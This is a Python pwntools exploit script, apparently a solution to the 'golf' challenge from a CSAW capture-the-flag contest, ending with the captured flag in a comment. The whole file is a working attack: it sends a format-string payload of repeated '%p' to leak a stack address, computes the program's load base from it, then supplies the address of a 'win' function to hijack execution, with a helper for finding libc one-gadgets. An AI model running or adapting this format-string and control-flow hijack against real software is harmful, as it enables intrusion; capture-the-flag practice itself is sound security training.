#!/usr/bin/env python3

from pwn import *

elf = ELF("./golf_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
continue
'''

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)


def start():
    if args.REMOTE:
        return remote("golfing.ctf.csaw.io", 9999)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])


r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
payload = b"%p "* 340
sla(b"to enter your name?", payload)
leak = rcu(b" hello: ", b"\n").split(b" ")

leak = int(leak[170],16)
log.info(f" leak = {hex(leak)}")
base = leak-0x1223
log.info(f"base = {hex(base)}")
elf.address = base

log.info(f"win = {hex(elf.sym.win)} dec = {elf.sym.win}")

sla(b" to aim at!:", hex(elf.sym.win).encode('ascii'))
#========= interactive ====================
r.interactive()
#csawctf{I_doNT_want_t0_g0_901FING_AnymOrE_pl34S3_Thank_you_!!!}